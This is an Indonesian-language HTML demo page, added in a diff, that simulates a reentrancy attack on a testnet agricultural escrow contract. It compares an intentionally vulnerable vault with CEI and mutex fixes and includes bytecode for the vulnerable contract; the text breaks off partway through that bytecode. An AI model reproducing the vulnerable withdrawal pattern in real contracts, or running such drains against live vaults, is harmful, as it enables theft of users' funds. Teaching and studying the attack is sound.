@@ -1,0 +1,569 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<meta http-equiv="Pragma" content="no-cache">
+<meta http-equiv="Expires" content="0">
+<title>🌾 Reentrancy Attack — Rantai Pasok Pertanian</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.13.5/ethers.umd.min.js"></script>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#0b0d14;color:#e4e6f0;padding:16px;min-height:100vh}
+.container{max-width:1020px;margin:0 auto}
+header{display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;flex-wrap:wrap;gap:10px}
+h1{font-size:20px;font-weight:800}
+h1 .grad{background:linear-gradient(135deg,#3b82f6,#60a5fa);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+h1 .badge{font-size:10px;background:rgba(59,130,246,.15);color:#60a5fa;padding:2px 10px;border-radius:6px;-webkit-text-fill-color:#60a5fa;margin-left:6px}
+.wallet-bar{display:flex;align-items:center;gap:10px;padding:7px 14px;background:#1a1d28;border-radius:10px;border:1px solid #2a2d3a;font-size:12px}
+.dot{width:9px;height:9px;border-radius:50%;background:#555;transition:all .3s}
+.dot.on{background:#22c55e;box-shadow:0 0 10px #22c55e55}
+.btn{padding:8px 16px;border:none;border-radius:9px;font-size:12px;font-weight:600;cursor:pointer;transition:all .2s;color:#fff;line-height:1.2}
+.btn:disabled{opacity:.35;cursor:not-allowed;transform:none!important}
+.btn:hover:not(:disabled){transform:translateY(-1.5px);filter:brightness(1.12)}
+.btn-primary{background:#3b82f6}
+.btn-danger{background:#ef4444}
+.btn-success{background:#22c55e}
+.btn-amber{background:#f59e0b;color:#000}
+.btn-purple{background:#8b5cf6}
+.btn-sm{padding:5px 12px;font-size:11px}
+.btn-outline{background:transparent;border:1px solid #2a2d3a;color:#e4e6f0}
+.btn-outline:hover{border-color:#3b82f6;color:#60a5fa}
+.card{background:#1a1d28;border:1px solid #2a2d3a;border-radius:12px;padding:16px;margin-bottom:14px;transition:border-color .4s}
+.card-title{font-size:10px;color:#888a9a;text-transform:uppercase;letter-spacing:.5px;margin-bottom:10px;display:flex;align-items:center;gap:6px}
+.row{display:grid;grid-template-columns:1fr 1fr;gap:14px}
+@media(max-width:700px){.row{grid-template-columns:1fr}}
+
+/* ===== MODE SELECTOR ===== */
+.mode-tabs{display:flex;gap:6px;margin-bottom:14px;flex-wrap:wrap}
+.mode-tab{padding:8px 18px;border-radius:9px;border:2px solid #2a2d3a;cursor:pointer;font-size:12px;font-weight:700;transition:all .25s;background:transparent;color:#888a9a}
+.mode-tab:hover{color:#e4e6f0}
+.mode-tab.active{border-color:#3b82f6;background:rgba(59,130,246,.1);color:#60a5fa}
+.mode-tab.insecure.active{border-color:#ef4444;background:rgba(239,68,68,.1);color:#ef4444}
+.mode-tab.secure.active{border-color:#22c55e;background:rgba(34,197,94,.1);color:#22c55e}
+.mode-tab.mutex.active{border-color:#f59e0b;background:rgba(245,158,11,.1);color:#f59e0b}
+
+/* ===== STORY PANEL ===== */
+.story-wrap{background:linear-gradient(135deg,#1a1d28,#1e2230);border:1px solid #2a2d3a;border-radius:12px;padding:16px;margin-bottom:14px;position:relative;overflow:hidden}
+.story-wrap .bar{position:absolute;top:0;left:0;right:0;height:3px}
+.story-wrap .bar.red{background:linear-gradient(90deg,#ef4444,#f59e0b)}
+.story-wrap .bar.green{background:linear-gradient(90deg,#22c55e,#3b82f6)}
+.story-wrap .bar.amber{background:linear-gradient(90deg,#f59e0b,#ef4444)}
+.story-scene{display:flex;gap:12px;flex-wrap:wrap;align-items:stretch;margin-top:10px}
+.story-char{flex:1;min-width:100px;padding:12px;border-radius:10px;border:1px solid #2a2d3a;text-align:center;transition:all .4s;position:relative}
+.story-char .avatar{font-size:30px;margin-bottom:4px}
+.story-char .name{font-size:12px;font-weight:600}
+.story-char .desc{font-size:10px;color:#888a9a;margin-top:2px}
+.story-char .amount{font-size:12px;font-weight:700;margin-top:4px}
+.story-char.farmer-a{border-color:#3b82f644;background:rgba(59,130,246,.05)}
+.story-char.farmer-b{border-color:#22c55e44;background:rgba(34,197,94,.05)}
+.story-char.vault{border-color:#f59e0b44;background:rgba(245,158,11,.05)}
+.story-char.attacker{border-color:#ef444444;background:rgba(239,68,68,.05)}
+.story-char.you{border-color:#8b5cf644;background:rgba(139,92,246,.05)}
+.story-char.depositing{border-color:#3b82f6;box-shadow:0 0 16px rgba(59,130,246,.2)}
+.story-char.draining{border-color:#ef4444;box-shadow:0 0 16px rgba(239,68,68,.25);animation:shake .3s infinite}
+@keyframes shake{0%,100%{transform:translateX(0)}25%{transform:translateX(-2px)}75%{transform:translateX(2px)}}
+
+/* ===== VAULT BOX ===== */
+.vault-row{display:flex;gap:14px;flex-wrap:wrap}
+.vb{flex:1;min-width:180px;padding:14px;border-radius:10px;border:1px solid #2a2d3a;display:flex;align-items:center;gap:14px;transition:all .5s}
+.vb .ico{width:54px;height:68px;border-radius:8px;border:2px solid #334155;position:relative;overflow:hidden;flex-shrink:0;transition:all .5s}
+.vb .ico .fill{position:absolute;bottom:0;left:0;width:100%;transition:height .7s cubic-bezier(.4,0,.2,1)}
+.vb .ico .overlay{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:20px}
+.vb .info .lb{font-size:10px;color:#888a9a}
+.vb .info .bal{font-size:20px;font-weight:700}
+.vb .info .bal .u{font-size:11px;color:#888a9a;font-weight:400}
+.vb .info .ad{font-size:10px;color:#888a9a;word-break:break-all;margin-top:2px}
+.vb-safe{border-color:#22c55e33}.vb-safe .ico{border-color:#22c55e44}.vb-safe .fill{background:linear-gradient(to top,#22c55e88,#22c55e33)}
+.vb-drained{border-color:#ef444433}.vb-drained .ico{border-color:#ef444444;background:#2d1b1b}.vb-drained .fill{background:linear-gradient(to top,#ef444488,#ef444422)}
+.vb-attacker{border-color:#3b82f633}.vb-attacker .ico{border-color:#3b82f644}.vb-attacker .fill{background:linear-gradient(to top,#ef444488,#ef444422)}
+
+/* ===== STEPS ===== */
+.steps{display:flex;flex-direction:column;gap:10px}
+.step{padding:14px;border-radius:10px;border:1px solid #2a2d3a;transition:all .4s;position:relative;overflow:hidden}
+.step::before{content:'';position:absolute;top:0;left:0;bottom:0;width:3px;background:#2a2d3a;transition:all .4s;border-radius:0 2px 2px 0}
+.step.active::before{background:#3b82f6;box-shadow:0 0 8px #3b82f666}
+.step.done::before{background:#22c55e}
+.step.fail::before{background:#ef4444}
+.step.active{border-color:#3b82f633;background:rgba(59,130,246,.03)}
+.step.done{border-color:#22c55e33;background:rgba(34,197,94,.03)}
+.step.fail{border-color:#ef444433;background:rgba(239,68,68,.03)}
+.sh{display:flex;align-items:flex-start;gap:10px;margin-bottom:6px}
+.sn{width:28px;height:28px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:700;flex-shrink:0;background:#2a2d3a;transition:all .3s}
+.step.done .sn{background:#22c55e}
+.step.fail .sn{background:#ef4444}
+.step.active .sn{background:#3b82f6;animation:pulse 1.4s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.5}}
+.si{flex:1}
+.st{font-weight:700;font-size:14px;margin-bottom:6px}
+.st .mode-badge{font-size:9px;padding:1px 7px;border-radius:4px;font-weight:600;margin-left:6px;vertical-align:middle}
+.st .mode-badge.red{background:rgba(239,68,68,.15);color:#ef4444}
+.st .mode-badge.green{background:rgba(34,197,94,.15);color:#22c55e}
+.sd{font-size:12px;color:#a0a2b0}
+.sa{margin-top:8px}
+.sr{font-size:11px;margin-top:6px;padding:6px 10px;border-radius:6px;background:#0b0d14;display:none;line-height:1.5}
+.step.done .sr,.step.fail .sr{display:block}
+
+/* ===== CODE VIEWER ===== */
+.cv{background:#0b0d14;border-radius:8px;border:1px solid #2a2d3a;font-family:'Fira Code',Consolas,monospace;font-size:11px;overflow:hidden;margin-top:6px}
+.cv .ch{display:flex;justify-content:space-between;align-items:center;padding:6px 12px;background:#1a1d28;border-bottom:1px solid #2a2d3a;font-size:10px;color:#888a9a;font-family:'Segoe UI',sans-serif}
+.cv .cb{padding:10px 12px;line-height:1.7;overflow-x:auto}
+.cv .l{display:flex}
+.cv .ln{width:24px;flex-shrink:0;color:#555;text-align:right;padding-right:10px;user-select:none}
+.cv .lc{white-space:pre}
+.cv .l.hl{background:rgba(239,68,68,.12);border-radius:3px;margin:0 -12px;padding:0 12px;animation:cp 1.5s infinite}
+.cv .l.hl .lc{color:#ef4444;font-weight:600}
+.cv .l.fix{background:rgba(34,197,94,.12);border-radius:3px;margin:0 -12px;padding:0 12px}
+.cv .l.fix .lc{color:#22c55e;font-weight:600}
+@keyframes cp{0%,100%{box-shadow:inset 3px 0 0 rgba(239,68,68,.5)}50%{box-shadow:inset 3px 0 0 rgba(239,68,68,1)}}
+.cv .cc{color:#666;font-style:italic}
+
+/* ===== FLOW DIAGRAM ===== */
+.fd{display:flex;flex-direction:column;align-items:center;gap:4px;padding:14px;font-size:12px}
+.fd .fr{display:flex;align-items:center;gap:10px;flex-wrap:wrap;justify-content:center}
+.fd .fb{padding:6px 14px;border-radius:7px;border:1px solid #2a2d3a;text-align:center;min-width:70px;transition:all .4s;font-size:11px}
+.fd .fb .fi{font-size:16px}
+.fd .fb.act{border-color:#3b82f6;background:rgba(59,130,246,.1)}
+.fd .fb.dng{border-color:#ef4444;background:rgba(239,68,68,.1);animation:shake .3s infinite}
+.fd .fb.suc{border-color:#22c55e;background:rgba(34,197,94,.1)}
+.fd .fc{color:#555;font-size:14px;transition:all .4s}
+.fd .fc.act{color:#ef4444;animation:br .4s infinite}
+.fd .fc.done{color:#22c55e}
+@keyframes br{0%,100%{transform:translateX(0)}50%{transform:translateX(4px)}}
+.fd .fl{display:flex;align-items:center;gap:6px;margin-top:4px;padding:5px 12px;border-radius:5px;background:rgba(239,68,68,.06);border:1px dashed rgba(239,68,68,.3);transition:all .5s;font-size:11px}
+.fd .fl.h{opacity:0;pointer-events:none}
+
+/* ===== EXPLAIN ===== */
+.eb{padding:12px;border-radius:8px;margin-top:6px;border-left:4px solid #3b82f6;background:rgba(59,130,246,.03);transition:all .4s;font-size:12px;line-height:1.6}
+.eb .et{font-weight:700;font-size:13px;margin-bottom:3px}
+.eb .ebd{color:#c0c2d0}
+.eb .ebd code{background:rgba(59,130,246,.12);padding:1px 5px;border-radius:3px;font-size:11px;color:#60a5fa}
+.eb.sd{border-left-color:#22c55e;background:rgba(34,197,94,.03)}
+.eb.sf{border-left-color:#ef4444;background:rgba(239,68,68,.03)}
+
+/* ===== REENTRY ===== */
+.ra{margin-top:10px;padding:10px;border-radius:7px;background:#0b0d14;border:1px solid #2a2d3a}
+.ra .rt{font-size:11px;color:#888a9a;margin-bottom:6px;display:flex;align-items:center;gap:5px}
+.rb{display:flex;align-items:center;gap:2px;flex-wrap:wrap}
+.rdot{width:14px;height:14px;border-radius:3px;background:#2a2d3a;transition:all .3s;position:relative}
+.rdot.f{background:#ef4444;box-shadow:0 0 8px #ef4444cc;animation:rp .25s ease-out}
+.rdot.f::after{content:'↻';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:8px;color:#fff;font-weight:700}
+@keyframes rp{0%{transform:scale(0);opacity:1}60%{transform:scale(1.3)}100%{transform:scale(1);opacity:1}}
+.rdot.ok{background:#22c55e;box-shadow:0 0 8px #22c55ecc}
+.rdot.ok::after{content:'✓';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);font-size:8px;color:#fff;font-weight:700}
+
+/* Reentry Live Stats */
+.rstats{display:flex;gap:10px;margin-top:6px;flex-wrap:wrap}
+.rstat{padding:4px 10px;border-radius:5px;background:#0b0d14;border:1px solid #2a2d3a;font-size:11px;min-width:60px;text-align:center}
+.rstat .rsval{font-weight:700;font-size:13px;color:#ef4444}
+.rstat .rslb{font-size:8px;color:#888a9a;text-transform:uppercase}
+.rstat.ok .rsval{color:#22c55e}
+
+/* Drain Progress */
+.drain-bar{width:100%;height:8px;background:#0b0d14;border-radius:4px;margin-top:6px;overflow:hidden;border:1px solid #2a2d3a}
+.drain-bar .dfill{height:100%;width:0%;background:linear-gradient(90deg,#ef4444,#f59e0b);border-radius:4px;transition:width .5s ease}
+
+/* ===== RESULTS ===== */
+.cr{display:flex;gap:14px;flex-wrap:wrap}
+.cc{flex:1;min-width:100px;padding:12px;border-radius:8px;border:1px solid #2a2d3a;transition:all .4s}
+.cc.bb{background:rgba(239,68,68,.05);border-color:rgba(239,68,68,.2)}
+.cc.ba{background:rgba(34,197,94,.05);border-color:rgba(34,197,94,.2)}
+.cc.bp{background:rgba(239,68,68,.08);border-color:rgba(239,68,68,.3)}
+.cc .lb{font-size:10px;color:#888a9a;text-transform:uppercase;letter-spacing:.3px}
+.cc .vl{font-size:20px;font-weight:700;margin-top:3px;transition:all .4s}
+.cc .vl .u2{font-size:11px;color:#888a9a;font-weight:400}
+
+/* ===== LOG ===== */
+.lb2{max-height:140px;overflow-y:auto;font-family:'Fira Code',Consolas,monospace;font-size:10px;line-height:1.5}
+.lb2 div{padding:2px 6px;border-bottom:1px solid rgba(255,255,255,.02)}
+.l-ok{color:#22c55e}
+.l-er{color:#ef4444;background:rgba(239,68,68,.04)}
+.l-in{color:#60a5fa}
+.l-wa{color:#f59e0b}
+.l-sp{color:#c084fc;font-weight:600}
+
+/* ===== CONFIG ===== */
+.cg{display:flex;gap:8px;margin-bottom:8px;flex-wrap:wrap}
+.cg>div{flex:1;min-width:120px}
+.cg label{font-size:10px;color:#888a9a;display:block;margin-bottom:2px;text-transform:uppercase;letter-spacing:.3px}
+.cg input{width:100%;padding:6px 9px;border-radius:7px;border:1px solid #2a2d3a;background:#0b0d14;color:#e4e6f0;font-size:11px;font-family:'Fira Code',monospace}
+.cg input:focus{outline:none;border-color:#3b82f6}
+.cb2{display:flex;gap:6px;flex-wrap:wrap}
+.nb{display:inline-block;padding:2px 8px;border-radius:5px;font-size:10px;font-weight:600;background:rgba(59,130,246,.12);color:#60a5fa}
+.h{display:none!important}
+.al{padding:8px 12px;border-radius:7px;font-size:11px;margin-bottom:10px;animation:si .3s ease-out}
+@keyframes si{0%{transform:translateY(-8px);opacity:0}100%{transform:translateY(0);opacity:1}}
+.al-w{background:rgba(245,158,11,.1);border:1px solid rgba(245,158,11,.3);color:#f59e0b}
+.al-o{background:rgba(34,197,94,.1);border:1px solid rgba(34,197,94,.3);color:#22c55e}
+.al-e{background:rgba(239,68,68,.1);border:1px solid rgba(239,68,68,.3);color:#ef4444}
+
+/* ===== MODE INFO BANNER ===== */
+.mode-info{display:flex;gap:10px;align-items:center;padding:10px 14px;border-radius:8px;margin-bottom:12px;font-size:12px}
+.mode-info .mi-icon{font-size:22px}
+.mode-info .mi-text{flex:1}
+.mode-info .mi-title{font-weight:700;font-size:13px}
+.mode-info.mi-red{background:rgba(239,68,68,.08);border:1px solid rgba(239,68,68,.2)}
+.mode-info.mi-green{background:rgba(34,197,94,.08);border:1px solid rgba(34,197,94,.2)}
+.mode-info.mi-amber{background:rgba(245,158,11,.08);border:1px solid rgba(245,158,11,.2)}
+</style>
+</head>
+<body>
+<div class="container">
+
+<!-- ===== HEADER ===== -->
+<header>
+<h1><span class="grad">🌾 Reentrancy Attack</span> <span class="badge">Sepolia</span></h1>
+<div class="wallet-bar">
+<span class="dot" id="dot"></span>
+<span id="walletStatus">Wallet disconnected</span>
+<button class="btn btn-sm btn-primary" id="btnConnect" onclick="connectWallet()">Connect Wallet</button>
+</div>
+</header>
+<div id="networkAlert" class="al h"></div>
+
+<!-- ===== MODE SELECTOR ===== -->
+<div class="mode-tabs" id="modeTabs">
+<button class="mode-tab insecure active" data-mode="insecure" onclick="switchMode('insecure')">🔴 InsecureVault (Rentan)</button>
+<button class="mode-tab secure" data-mode="secure" onclick="switchMode('secure')">🟢 SecureVault (CEI)</button>
+<button class="mode-tab mutex" data-mode="mutex" onclick="switchMode('mutex')">🟡 MutexVault (Lock)</button>
+</div>
+
+<!-- ===== MODE INFO BANNER ===== -->
+<div id="modeInfo" class="mode-info mi-red">
+<div class="mi-icon">🔴</div>
+<div class="mi-text">
+<div class="mi-title" id="modeInfoTitle">Mode: InsecureVault — Rentan terhadap Reentrancy</div>
+<div id="modeInfoDesc">Kontrak asli tanpa mitigasi. Fungsi <code>withdrawFunds()</code> melakukan transfer ETH SEBELUM mengosongkan saldo — melanggar pola CEI. Cocok untuk simulasi eksploitasi.</div>
+</div>
+</div>
+
+<!-- ===== STORY PANEL ===== -->
+<div class="story-wrap">
+<div class="bar red" id="modeBar"></div>
+<div class="card-title" id="storyTitle">🌾 Kisah: Platform Rantai Pasok Pertanian — Simulasi Eksploitasi</div>
+<div class="story-scene">
+<div class="story-char farmer-a" id="charFA"><div class="avatar">👨‍🌾</div><div class="name">Pembeli A</div><div class="desc">Bayar 1 ton komoditas<br>⏳ 1.5 ETH</div><div class="amount" id="charFAAmt">⏳ 1.5 ETH</div></div>
+<div class="story-char farmer-b" id="charFB"><div class="avatar">👩‍🌾</div><div class="name">Pembeli B</div><div class="desc">Bayar parsial<br>⏳ 0.8 ETH</div><div class="amount" id="charFBAmt">⏳ 0.8 ETH</div></div>
+<div class="story-char vault" id="charVault"><div class="avatar">🏪</div><div class="name">Platform Escrow</div><div class="desc">Menahan dana pembelian</div><div class="amount" id="charVaultAmt">0 ETH</div></div>
+<div class="story-char attacker" id="charAtt"><div class="avatar">👾</div><div class="name">Penyerang</div><div class="desc">Menyusup sbg penjual kecil<br>🎯 deposit 0.1 ETH</div><div class="amount" id="charAttAmt">🎯 0.1 ETH</div></div>
+<div class="story-char you" id="charYou"><div class="avatar">🦸</div><div class="name">Peneliti</div><div class="desc">Simulasi eksploitasi</div><div class="amount" id="charYouAmt">—</div></div>
+</div>
+</div>
+
+<!-- ===== CONFIG ===== -->
+<div class="card">
+<div class="card-title">⚙️ Setup Kontrak</div>
+<div class="cg">
+<div><label>🌐 Network</label><span class="nb">Sepolia (11155111)</span></div>
+<div><label id="vaultLabel">🏪 Vault</label><input id="inputVault" placeholder="0x..."></div>
+<div><label id="attLabel">👾 Attacker</label><input id="inputAttacker" placeholder="0x..."></div>
+</div>
+<div class="cb2" style="margin-top:4px">
+<button class="btn btn-primary" onclick="loadContracts()" id="btnLoad">📦 Load Contracts</button>
+<button class="btn btn-success" onclick="deployContracts()" id="btnDeploy">🚀 Deploy</button>
+<button class="btn btn-outline btn-sm" onclick="showDeployGuide()">📋 Manual</button>
+<span id="modeAddrHint" style="font-size:10px;color:#666;align-self:center">🔴 Mode: InsecureVault</span>
+</div>
+</div>
+
+<!-- ===== VAULT STATUS ===== -->
+<div class="row">
+<div class="vb vb-safe" id="vaultBox">
+<div class="ico" id="vaultIcon"><div class="fill" id="vaultFill" style="height:100%"></div><div class="overlay" id="vaultLock">🔒</div></div>
+<div class="info"><div class="lb" id="vaultLb">🏪 Platform Escrow</div><div class="bal"><span id="vaultBal">0.0</span><span class="u"> ETH</span></div><div class="ad" id="vaultAddr">Not loaded</div></div>
+</div>
+<div class="vb vb-attacker" id="attBox">
+<div class="ico" id="attIcon2"><div class="fill" id="attFill" style="height:0%"></div><div class="overlay">👾</div></div>
+<div class="info"><div class="lb" id="attLb">👾 Kontrak Penyerang</div><div class="bal"><span id="attBal">0.0</span><span class="u"> ETH</span></div><div class="ad" id="attAddr">Not loaded</div></div>
+</div>
+</div>
+
+<!-- ===== STEPS ===== -->
+<div class="card">
+<div class="card-title">🎯 Tahapan Eksperimen</div>
+<div class="steps" id="steps">
+<div class="step" id="s0">
+<div class="sh"><div class="sn">1</div><div class="si"><div class="st">🌾 Inisialisasi Honeypot <span class="mode-badge red" id="s0badge">🔴 Insecure</span></div><div class="sd">Pembeli A deposit 1.5 ETH (1 ton komoditas) & Pembeli B deposit 0.8 ETH. Penyerang menyusup sebagai penjual kecil: deposit 0.1 ETH. <strong>Total escrow: 2.4 ETH</strong> (honeypot 2.3 ETH + modal penyerang 0.1 ETH)</div></div></div>
+<div class="sa"><button class="btn btn-sm btn-primary" id="b0" onclick="stepSetup()">▶️ Jalankan Step 1</button></div>
+<div class="sr" id="r0"></div>
+</div>
+<div class="step" id="s1">
+<div class="sh"><div class="sn">2</div><div class="si"><div class="st">⚡ Eksekusi Reentrancy <span class="mode-badge red" id="s1badge">🔴 Insecure</span></div><div class="sd">Penyerang panggil <code>attack()</code> → tarik 0.1 ETH → <code>receive()</code> terpicu → panggil <code>withdrawFunds()</code> LAGI berulang kali sebelum saldo direset. 🔄 <strong>Target: 2.4 ETH</strong></div></div></div>
+<div class="sa"><button class="btn btn-sm btn-danger" id="b1" onclick="stepAttack()" disabled>⚡ Jalankan Serangan</button></div>
+<div class="sr" id="r1"></div>
+<div class="ra h" id="reentryArea"><div class="rt">⚡ REENTRANCY LOOP — 0,1 ETH ditarik berulang kali dalam 1 transaksi!</div><div class="rb" id="reentryBar"></div><div class="rstats"><div class="rstat" id="rsCount"><div class="rslb">Loop ke-</div><div class="rsval" id="rsCountVal">0</div></div><div class="rstat" id="rsDrained"><div class="rslb">Total terkuras</div><div class="rsval" id="rsDrainedVal">0 ETH</div></div><div class="rstat" id="rsStatus"><div class="rslb">Status</div><div class="rsval" style="font-size:11px" id="rsStatusVal">⏳ Menunggu...</div></div></div><div class="drain-bar"><div class="dfill" id="drainFill"></div></div><div style="font-size:10px;color:#888a9a;margin-top:4px"><span id="reentrySummary">Setiap titik merah = 1 panggilan <code>withdrawFunds()</code> berulang</span></div></div>
+</div>
+<div class="step" id="s2">
+<div class="sh"><div class="sn">3</div><div class="si"><div class="st">💰 Evaluasi Hasil <span class="mode-badge red" id="s2badge">🔴 Insecure</span></div><div class="sd">🔴 Insecure: dana 2.4 ETH terkuras | 🟢 CEI / 🟡 Mutex: dana 2.4 ETH aman</div></div></div>
+<div class="sa"><button class="btn btn-sm btn-amber" id="b2" onclick="stepCollect()" disabled>💰 Lihat Hasil</button></div>
+<div class="sr" id="r2"></div>
+</div>
+</div>
+</div>
+
+<!-- ===== CODE VIEWER ===== -->
+<div class="card">
+<div class="card-title">📄 Live Code — Fungsi <code>withdrawFunds()</code></div>
+<div class="cv">
+<div class="ch"><span id="codeFile">📁 InsecureVault.sol</span><span id="codeStatus" style="color:#888a9a">⏸️ Menunggu eksekusi</span></div>
+<div class="cb" id="codeBody"></div>
+</div>
+<div class="eb" id="explainBox">
+<div class="et" id="explainTitle">💡 Menunggu eksekusi...</div>
+<div class="ebd" id="explainBody">Pilih mode di atas, deploy kontrak, lalu jalankan step 1-3.</div>
+</div>
+</div>
+
+<!-- ===== FLOW DIAGRAM ===== -->
+<div class="card">
+<div class="card-title">🔁 Alur Serangan</div>
+<div class="fd" id="flowDiagram">
+<div class="fr">
+<div class="fb" id="fw"><div class="fi">🦸</div>Wallet</div>
+<div class="fc" id="fc1">➡️</div>
+<div class="fb" id="fa"><div class="fi" id="faIcon">👾</div><span id="faLabel">Attacker.attack()</span></div>
+<div class="fc" id="fc2">➡️</div>
+<div class="fb" id="fv"><div class="fi">🏪</div><span id="fvLabel">Vault tarik 0.1 ETH</span></div>
+</div>
+<div class="fl h" id="flowLoop">🔄 <span style="color:#ef4444;font-weight:600">REENTRANCY LOOP</span><span style="color:#888">→</span> receive()<span style="color:#888">→</span> withdrawFunds() lagi... <span id="flowLoopCount" style="color:#ef4444;font-weight:700">0×</span></div>
+<div style="font-size:10px;color:#888a9a;margin-top:2px"><span id="flowStatus">⏸️ Menunggu serangan dimulai...</span></div>
+</div>
+</div>
+
+<!-- ===== RESULTS ===== -->
+<div class="card">
+<div class="card-title">📊 Hasil Eksperimen</div>
+<div class="cr">
+<div class="cc bb"><div class="lb">💰 Escrow Sebelum</div><div class="vl"><span id="beforeVal">0.0</span><span class="u2"> ETH</span></div></div>
+<div class="cc ba"><div class="lb" id="afterLb">💀 Escrow Sesudah</div><div class="vl"><span id="afterVal">0.0</span><span class="u2"> ETH</span></div></div>
+<div class="cc bp"><div class="lb">🏴‍☠️ Illegal Profit</div><div class="vl" style="color:#ef4444"><span id="profitVal">0.0</span><span class="u2"> ETH</span></div></div>
+</div>
+</div>
+
+<!-- ===== LOG ===== -->
+<div class="card">
+<div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:6px">
+<span class="card-title" style="margin:0">📋 Activity Log <span id="gasSummary" style="font-weight:400;font-size:10px;color:#888a9a"></span></span>
+<button class="btn btn-sm btn-outline" onclick="document.getElementById('logBox2').innerHTML=''">Clear</button>
+</div>
+<div class="lb2" id="logBox2"><div class="l-in">🌾 Simulasi reentrancy pada smart contract escrow rantai pasok pertanian.</div></div>
+</div>
+</div>
+
+<script>
+let provider, signer, walletAddr, chainId;
+let vault, attacker, vaultAddr, attAddr;
+let currentMode = 'insecure'; // 'insecure' | 'secure' | 'mutex'
+let gasLog = [], totalGasUsed = 0n;
+
+const SEPOLIA = 11155111;
+
+// ===== CONTRACT DATA =====
+const CONTRACTS = {
+  insecure: {
+    name: 'InsecureVault', label: '🔴 Insecure', color: 'red',
+    vaultAddr: '0xA9f9D28167A4Ca45554544f43905De2B6D2f37bc',
+    attAddr: '0xc44109595b6d25c49f33521326f4d291e292A50f',
+    bytecode: { vault: '0x6080604052348015600f57600080fd5b506109f98061001f6000396000f3fe6080604052600436106100955760003560e01c8063a85c38ef11610059578063a85c38ef14610134578063d09ef24114610196578063ea3774e3146101eb578063f8b2cb4f1461020b578063fd84cb971461024157600080fd5b80632453ffa8146100a157806324600fc3146100ca57806327e235e3146100e15780633b76594d1461010e5780636f9fb98a1461012157600080fd5b3661009c57005b600080fd5b3480156100ad57600080fd5b506100b760025481565b6040519081526020015b60405180910390f35b3480156100d657600080fd5b506100df610261565b005b3480156100ed57600080fd5b506100b76100fc3660046108d0565b60016020526000908152604090205481565b6100df61011c366004610900565b6103c2565b34801561012d57600080fd5b50476100b7565b34801561014057600080fd5b5061018661014f366004610900565b60006020819052908152604090208054600182015460028301546003909301546001600160a01b0392831693919092169160ff1684565b6040516100c1949392919061092f565b3480156101a257600080fd5b506101866101b1366004610900565b60009081526020819052604090208054600182015460028301546003909301546001600160a01b039283169492909116929160ff90911690565b3480156101f757600080fd5b506100b76102063660046108d0565b6105a4565b34801561021757600080fd5b506100b76102263660046108d0565b6001600160a01b031660009081526001602052604090205490565b34801561024d57600080fd5b506100df61025c366004610900565b610795565b33600090815260016020526040902054806102cf5760405162461bcd60e51b815260206004820152602360248201527f496e7365637572655661756c743a206e6f2066756e647320746f20776974686460448201526272617760e81b60648201526084015b60405180910390fd5b604051600090339083908381818185875af1925050503d8060008114610311576040519150601f19603f3d011682016040523d82523d6000602084013e610316565b606091505b50509050806103725760405162461bcd60e51b815260206004820152602260248201527f496e7365637572655661756c743a20455448207472616e73666572206661696c604482015261195960f21b60648201526084016102c6565b3360008181526001602052604080822091909155517feaff4b37086828766ad3268786972c0cd24259d4c87a80f9d3963a3c3d999b0d906103b69085815260200190565b60405180910390a25050565b600081815260208190526040902080546001600160a01b031633146104375760405162461bcd60e51b815260206004820152602560248201527f496e7365637572655661756c743a206f6e6c792062757965722063616e2064656044820152641c1bdcda5d60da1b60648201526084016102c6565b600060038083015460ff169081111561045257610452610919565b146104b55760405162461bcd60e51b815260206004820152602d60248201527f496e7365637572655661756c743a206f72646572206d75737420626520696e2060448201526c4352454154454420737461746560981b60648201526084016102c6565b6000341161051e5760405162461bcd60e51b815260206004820152603060248201527f496e7365637572655661756c743a206465706f736974206d757374206265206760448201526f726561746572207468616e207a65726f60801b60648201526084016102c6565b346002820181905560038201805460ff19166001908117909155808301546001600160a01b03166000908152602091909152604081208054909190610564908490610991565b9091555050604051348152339083907fe030e47e27825a2ad1b19e4cf2e70bfbfb3124af275c7727a82b114ba7b29a859060200160405180910390a35050565b60006001600160a01b0382166106115760405162461bcd60e51b815260206004820152602c60248201527f496e7365637572655661756c743a2073656c6c65722063616e6e6f742062652060448201526b7a65726f206164647265737360a01b60648201526084016102c6565b336001600160a01b038316036106845760405162461bcd60e51b815260206004820152603260248201527f496e7365637572655661756c743a20627579657220616e642073656c6c65722060448201527163616e6e6f74206265207468652073616d6560701b60648201526084016102c6565b50600254604080516080810182523381526001600160a01b0384166020820152600091810182905290606082015260008281526020818152604091829020835181546001600160a01b039182166001600160a01b0319918216178355928501516001808401805492909316919094161790559183015160028301556060830151600380840180549293909260ff191691849081111561072557610725610919565b021790555050600280549150600061073c836109aa565b9190505550816001600160a01b0316336001600160a01b0316827ff9e17940e547201709f9aaacdec8ab3566601c60d8f5affb54f74b79b0b50b13600060405161078891815260200190565b60405180910390a4919050565b600081815260208190526040902080546001600160a01b031633146108135760405162461bcd60e51b815260206004820152602e60248201527f496e7365637572655661756c743a206f6e6c792062757965722063616e20636f60448201526d6e6669726d2064656c697665727960901b60648201526084016102c6565b600160038083015460ff169081111561082e5761082e610919565b146108905760405162461bcd60e51b815260206004820152602c60248201527f496e7365637572655661756c743a206f72646572206d75737420626520696e2060448201526b4c4f434b454420737461746560a01b60648201526084016102c6565b60038101805460ff19166002179055604051339083907f64a783c6150854ae756454311c7625a965c757996ba8cc1a8c6205380f33725090600090a35050565b6000602082840312156108e257600080fd5b81356001600160a01b03811681146108f957600080fd5b9392505050565b60006020828403121561091257600080fd5b5035919050565b634e487b7160e01b600052602160045260246000fd5b6001600160a01b0385811682528416602082015260408101839052608081016004831061096c57634e487b7160e01b600052602160045260246000fd5b82606083015295945050505050565b634e487b7160e01b600052601160045260246000fd5b808201808211156109a4576109a461097b565b92915050565b6000600182016109bc576109bc61097b565b506001019056fe